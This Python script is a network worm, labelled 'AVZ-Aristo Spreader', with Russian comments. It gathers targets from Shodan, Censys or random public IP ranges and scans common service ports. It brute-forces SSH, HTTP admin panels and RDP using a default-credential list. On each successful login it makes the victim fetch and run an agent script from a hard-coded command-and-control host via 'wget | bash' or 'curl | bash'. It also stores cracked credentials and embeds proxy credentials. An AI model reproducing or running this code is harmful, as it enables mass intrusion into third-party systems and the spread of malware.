#!/usr/bin/env python3
# AVZ-Aristo Spreader v26.8 – Shodan/Censys, HTTP‑брут, прокси
import asyncio, aiohttp, random, socket, time, json, os, sys, argparse, ftplib, subprocess, ipaddress, logging, sqlite3, requests, traceback, shutil
from datetime import datetime, timezone, timedelta

if sys.platform != 'win32':
    import resource
    try:
        resource.setrlimit(resource.RLIMIT_NOFILE, (65535, 65535))
    except:
        pass

logging.getLogger("paramiko").setLevel(logging.WARNING)

C2_HOST = "80.249.146.202"
C2_PORT = 80
API_PORT = 8080
AGENT_URL = f"http://{C2_HOST}:{API_PORT}/agent_bash.sh"
MAX_CONCURRENT = 1500
QUICK_TIMEOUT = 3.0
BRUTE_TIMEOUT = 8.0
DEFAULT_SCAN_COUNT = 25_000
PORT_LIST = [21, 22, 23, 80, 443, 1433, 27017, 3306, 3389, 445, 5432, 5900, 5984, 5985, 6379, 8080, 9042, 9200]

CREDS = [
    ("root","root"), ("root","admin"), ("root","password"), ("root","123456"), ("root","1234"), ("root","pass"), ("root","toor"), ("root","changeme"),
    ("admin","admin"), ("admin","password"), ("admin","123456"), ("admin","1234"), ("admin","changeme"), ("admin",""),
    ("user","user"), ("user","password"), ("user","123456"),
    ("test","test"), ("guest","guest"), ("support","support"),
    ("sa",""), ("sa","sa"), ("sa","password"), ("sa","123456"),
    ("postgres","postgres"), ("postgres","password"), ("postgres","123456"),
    ("pi","raspberry"), ("pi","raspberrypi"), ("pi","password"),
    ("ubnt","ubnt"), ("admin","password1"),
    ("mysql","mysql"), ("oracle","oracle"),
    ("tomcat","tomcat"), ("jenkins","jenkins"),
    ("Administrator",""), ("Administrator","admin"), ("Administrator","password"), ("Administrator","123456"),
    ("cisco","cisco"), ("www-data","www-data"), ("alpine","alpine"),
    ("hadoop","hadoop"), ("elasticsearch","elasticsearch"),
    ("ftp","ftp"), ("anonymous","anonymous")
]

SUCCESS_CREDS_FILE = "success_creds.json"
SUCCESS_CREDS = []
if os.path.exists(SUCCESS_CREDS_FILE):
    with open(SUCCESS_CREDS_FILE) as f:
        SUCCESS_CREDS = json.load(f)

DB_FILE = "ports_cache.db"
conn = sqlite3.connect(DB_FILE)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS ports (ip text, port integer, seen integer, PRIMARY KEY (ip, port))''')
conn.commit()
PORT_CACHE_TTL = 3600

def is_port_cached(ip, port):
    c.execute("SELECT seen FROM ports WHERE ip=? AND port=? AND seen > ?", (ip, port, time.time() - PORT_CACHE_TTL))
    return c.fetchone() is not None

def cache_port(ip, port):
    c.execute("INSERT OR REPLACE INTO ports VALUES (?, ?, ?)", (ip, port, int(time.time())))
    conn.commit()

# Цели из Shodan/Censys
SHODAN_API_KEY = ""
CENSYS_API_ID = ""
CENSYS_SECRET = ""
try:
    with open("secrets.json") as f:
        s = json.load(f)
        SHODAN_API_KEY = s.get("shodan_api_key", "")
        CENSYS_API_ID = s.get("censys_api_id", "")
        CENSYS_SECRET = s.get("censys_secret", "")
except:
    pass

PROXY_URL = "socks5://3kBTM0Ya1FXxA7k:9e3c9b9c-1a11-4022-ad68-111eac0e7e21@budget.spyderproxy.com:11000"

def fetch_external_ips(count=100):
    ips = []
    # Пробуем Shodan
    if SHODAN_API_KEY:
        try:
            resp = requests.get(f"https://api.shodan.io/shodan/host/search?key={SHODAN_API_KEY}&query=port:22,445,3389,3306,6379,8080&limit={count}", timeout=10)
            if resp.status_code == 200:
                ips.extend([m['ip_str'] for m in resp.json().get('matches', [])])
        except:
            pass
    # Пробуем Censys
    if CENSYS_API_ID and CENSYS_SECRET:
        try:
            url = "https://search.censys.io/api/v2/hosts/search"
            data = {"query": "services.service_name: SSH or RDP or HTTP", "per_page": count}
            resp = requests.post(url, json=data, auth=(CENSYS_API_ID, CENSYS_SECRET), timeout=10)
            if resp.status_code == 200:
                ips.extend([h['ip'] for h in resp.json().get('result', {}).get('hits', [])])
        except:
            pass
    # Fallback: бесплатный InternetDB Shodan
    if not ips:
        try:
            resp = requests.get(f"https://internetdb.shodan.io/search?query=port:22,445,3389&limit={count}", timeout=10)
            if resp.status_code == 200:
                ips.extend(resp.json())
        except:
            pass
    return ips

GUARANTEED_IPS = [
    "45.33.32.156", "34.94.3.0", "45.77.165.0", "185.220.101.0", "23.226.229.0",
    "103.15.28.0", "185.225.19.0", "45.33.32.0", "45.56.89.0", "45.79.207.0"
]
random.shuffle(GUARANTEED_IPS)

TARGET_COUNTRY = os.environ.get("SPREAD_COUNTRY", "").upper()

def now_str():
    return datetime.now(timezone(timedelta(hours=5))).strftime("%Y-%m-%d %H:%M:%S")

def random_ip():
    if hasattr(random_ip, "external_pool") and random_ip.external_pool and random.random() < 0.6:
        return random.choice(random_ip.external_pool)
    if random.random() < 0.3:
        return random.choice(GUARANTEED_IPS)
    while True:
        a = random.randint(1, 223)
        b = random.randint(0, 255)
        c = random.randint(0, 255)
        d = random.randint(0, 255)
        if a == 10 or a == 127: continue
        if a == 172 and 16 <= b <= 31: continue
        if a == 192 and b == 168: continue
        if a >= 224: continue
        ip = f"{a}.{b}.{c}.{d}"
        if TARGET_COUNTRY:
            if get_country(ip) == TARGET_COUNTRY:
                return ip
        else:
            return ip

def get_country(ip):
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}", timeout=2)
        if resp.status_code == 200:
            return resp.json().get("countryCode", "")
    except:
        pass
    return ""

random_ip.external_pool = []
def update_external_pool():
    random_ip.external_pool = fetch_external_ips(100)

def get_local_ips():
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
    except:
        return []
    network = ipaddress.IPv4Network(f"{local_ip}/24", strict=False)
    return [str(host) for host in network.hosts() if str(host) != local_ip]

async def probe_port(ip, port):
    if is_port_cached(ip, port):
        return True
    try:
        _, w = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=QUICK_TIMEOUT)
        w.close(); await w.wait_closed()
        cache_port(ip, port)
        return True
    except:
        return False

async def ssh_brute(ip):
    if not shutil.which("sshpass"):
        print(f"[{now_str()}] [ERROR] sshpass не установлен", flush=True)
        return False
    for u, p in (SUCCESS_CREDS + CREDS):
        cmd = f"sshpass -p '{p}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o ServerAliveInterval=3 {u}@{ip} 'wget -O- {AGENT_URL} | bash'"
        try:
            proc = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=BRUTE_TIMEOUT)
            if proc.returncode == 0:
                save_success_creds(u, p)
                return True
        except asyncio.TimeoutError:
            pass
        except Exception as e:
            print(f"[{now_str()}] [ERROR] SSH {ip}:{u}:{p} – {e}", flush=True)
    return False

async def http_admin_brute(ip):
    """Брутфорс HTTP Basic Auth / WordPress / phpMyAdmin / Tomcat"""
    paths = [
        "/", "/admin", "/wp-login.php", "/phpmyadmin", "/manager/html"
    ]
    headers = {"User-Agent": "Mozilla/5.0"}
    for u, p in CREDS[:10]:
        for path in paths:
            url = f"http://{ip}{path}"
            try:
                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=3)) as s:
                    async with s.get(url, auth=aiohttp.BasicAuth(u, p), headers=headers) as resp:
                        if resp.status == 200:
                            # Попытка загрузить агента через curl
                            exploit_url = f"http://{ip}/cgi-bin/"
                            async with s.get(exploit_url, auth=aiohttp.BasicAuth(u, p),
                                             params={"cmd": f"wget -O- {AGENT_URL} | bash"}) as exp_resp:
                                if exp_resp.status == 200:
                                    save_success_creds(u, p)
                                    return True
            except:
                pass
    return False

async def rdp_brute(ip):
    if sys.platform != 'linux':
        return False
    if not shutil.which("xfreerdp"):
        return False
    for u, p in (SUCCESS_CREDS + CREDS[:15]):
        cmd = f"xfreerdp /v:{ip} /u:{u} /p:'{p}' /cert-ignore +auth-only /sec:nla"
        try:
            proc = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL)
            await asyncio.wait_for(proc.communicate(), timeout=5)
            if proc.returncode == 0:
                await asyncio.create_subprocess_shell(f"xfreerdp /v:{ip} /u:{u} /p:'{p}' /cert-ignore /sec:nla +home-drive /cmd:'cmd.exe /c curl -s {AGENT_URL} | bash'")
                save_success_creds(u, p)
                return True
        except:
            pass
    return False

def save_success_creds(username, password):
    pair = [username, password]
    if pair not in SUCCESS_CREDS:
        SUCCESS_CREDS.append(pair)
        with open(SUCCESS_CREDS_FILE, "w") as f:
            json.dump(SUCCESS_CREDS, f)

async def infect(ip, port_stats):
    ports = PORT_LIST
    open_ports = await asyncio.gather(*[probe_port(ip, p) for p in ports])
    for i, p in enumerate(ports):
        if open_ports[i]:
            port_stats[p] = port_stats.get(p, 0) + 1
    if open_ports[1] and await ssh_brute(ip):
        print(f"[{now_str()}] [INFECTED] {ip} via SSH", flush=True)
        return True
    if (open_ports[3] or open_ports[4]) and await http_admin_brute(ip):
        print(f"[{now_str()}] [INFECTED] {ip} via HTTP", flush=True)
        return True
    if open_ports[8] and await rdp_brute(ip):
        print(f"[{now_str()}] [INFECTED] {ip} via RDP", flush=True)
        return True
    return False

async def worker(queue, stats, port_stats, progress_cb=None):
    while True:
        ip = await queue.get()
        try:
            if await infect(ip, port_stats):
                stats['success'] += 1
            else:
                stats['fail'] += 1
        except Exception as e:
            print(f"[{now_str()}] [ERROR] {ip}: {e}", flush=True)
            stats['fail'] += 1
        if progress_cb:
            await progress_cb()
        queue.task_done()

async def scan_cycle(ips, progress_callback=None):
    q = asyncio.Queue()
    stats = {'success':0, 'fail':0}
    port_stats = {}
    count = len(ips)
    progress_count = 0
    start_time = time.time()

    async def progress_inner():
        nonlocal progress_count
        progress_count += 1
        if progress_count % 500 == 0 and progress_callback:
            await progress_callback(progress_count, count, stats, port_stats)
        elif progress_count % 100 == 0:
            percent = progress_count / count * 100
            elapsed = time.time() - start_time
            speed = progress_count / elapsed if elapsed > 0 else 0
            print(f"[{now_str()}] [PROGRESS] {progress_count}/{count} ({percent:.1f}%) | Infected: {stats['success']} | Failed: {stats['fail']} | Speed: {speed:.0f} IP/s", flush=True)

    for ip in ips:
        q.put_nowait(ip)
    tasks = [asyncio.create_task(worker(q, stats, port_stats, progress_inner)) for _ in range(MAX_CONCURRENT)]
    await q.join()
    for t in tasks:
        t.cancel()
    return stats, port_stats

async def global_scan(count, progress_callback=None):
    ips = [random_ip() for _ in range(count)]
    return await scan_cycle(ips, progress_callback)

async def local_scan(progress_callback=None):
    ips = get_local_ips()
    if not ips:
        return {'success':0, 'fail':0}, {}
    print(f"[{now_str()}] [*] Scanning local network, {len(ips)} hosts", flush=True)
    return await scan_cycle(ips, progress_callback)

async def main_async(args):
    print(f"[{now_str()}] [*] Checking C2 connection...", flush=True)
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect((C2_HOST, C2_PORT))
        s.sendall(b"ping")
        s.recv(1024)
        s.close()
        print(f"[{now_str()}] [+] C2 reachable", flush=True)
    except Exception as e:
        print(f"[{now_str()}] [!] C2 unreachable: {e}", flush=True)

    update_external_pool()

    targets = []
    if args.targets:
        if os.path.exists(args.targets):
            with open(args.targets) as f:
                targets = [line.strip() for line in f if line.strip()]
            print(f"[{now_str()}] [*] Loaded {len(targets)} targets from {args.targets}", flush=True)

    async def gui_progress(current, total, stats, port_stats):
        port_str = ", ".join(f"{p}: {c} open" for p, c in sorted(port_stats.items()))
        percent = current / total * 100
        if port_str:
            print(f"[{now_str()}] [PROGRESS] {current}/{total} ({percent:.1f}%) | Infected: {stats['success']} | Failed: {stats['fail']} | {port_str}", flush=True)
        else:
            print(f"[{now_str()}] [PROGRESS] {current}/{total} ({percent:.1f}%) | Infected: {stats['success']} | Failed: {stats['fail']} | All ports closed", flush=True)

    if args.local:
        print(f"[{now_str()}] [*] Mode: local network", flush=True)
        while True:
            stats, port_stats = await local_scan(gui_progress)
            print(f"[{now_str()}] Cycle: +{stats['success']} infected, {stats['fail']} failed", flush=True)
            await asyncio.sleep(30)
    elif targets:
        print(f"[{now_str()}] [*] Mode: targets from file", flush=True)
        while True:
            stats, port_stats = await scan_cycle(targets, gui_progress)
            print(f"[{now_str()}] Cycle: +{stats['success']} infected, {stats['fail']} failed", flush=True)
            await asyncio.sleep(60)
    else:
        print(f"[{now_str()}] [*] Mode: global, {args.count} targets per cycle", flush=True)
        while True:
            stats, port_stats = await global_scan(args.count, gui_progress)
            print(f"[{now_str()}] Cycle: +{stats['success']} infected, {stats['fail']} failed", flush=True)
            await asyncio.sleep(30)

def main():
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group()
    group.add_argument('--count', type=int, default=DEFAULT_SCAN_COUNT)
    group.add_argument('--local', action='store_true')
    group.add_argument('--targets', type=str, help='Path to targets file')
    args = parser.parse_args()
    try:
        asyncio.run(main_async(args))
    except KeyboardInterrupt:
        print(f"[{now_str()}] [*] Spreader stopped", flush=True)

if __name__ == '__main__':
    main()
